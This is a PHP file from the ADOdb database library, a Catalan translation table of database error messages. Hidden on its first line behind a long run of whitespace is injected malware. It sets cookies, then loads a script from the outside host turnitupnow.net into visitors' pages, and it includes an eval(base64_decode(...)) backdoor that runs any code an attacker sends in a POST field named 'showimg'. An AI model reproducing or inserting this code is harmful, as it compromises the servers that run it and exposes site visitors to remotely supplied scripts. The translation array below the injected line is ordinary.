<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Catalan language
// contributed by "Josep Lladonosa" jlladono#pie.xtec.es
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'ca',
            DB_ERROR                    => 'error desconegut',
            DB_ERROR_ALREADY_EXISTS     => 'ja existeix',
            DB_ERROR_CANNOT_CREATE      => 'no es pot crear',
            DB_ERROR_CANNOT_DELETE      => 'no es pot esborrar',
            DB_ERROR_CANNOT_DROP        => 'no es pot eliminar',
            DB_ERROR_CONSTRAINT         => 'violació de constraint',
            DB_ERROR_DIVZERO            => 'divisió per zero',
            DB_ERROR_INVALID            => 'no és vàlid',
            DB_ERROR_INVALID_DATE       => 'la data o l\'hora no són vàlides',
            DB_ERROR_INVALID_NUMBER     => 'el nombre no és vàlid',
            DB_ERROR_MISMATCH           => 'no hi ha coincidència',
            DB_ERROR_NODBSELECTED       => 'cap base de dades seleccionada',
            DB_ERROR_NOSUCHFIELD        => 'camp inexistent',
            DB_ERROR_NOSUCHTABLE        => 'taula inexistent',
            DB_ERROR_NOT_CAPABLE        => 'l\'execució secundària de DB no pot',
            DB_ERROR_NOT_FOUND          => 'no trobat',
            DB_ERROR_NOT_LOCKED         => 'no blocat',
            DB_ERROR_SYNTAX             => 'error de sintaxi',
            DB_ERROR_UNSUPPORTED        => 'no suportat',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'el nombre de columnes no coincideix amb el nombre de valors en la fila',
            DB_ERROR_INVALID_DSN        => 'el DSN no és vàlid',
            DB_ERROR_CONNECT_FAILED     => 'connexió fallida',
            0	                       => 'cap error', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'les dades subministrades són insuficients',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extensió no trobada',
            DB_ERROR_NOSUCHDB           => 'base de dades inexistent',
            DB_ERROR_ACCESS_VIOLATION   => 'permisos insuficients'
);
?>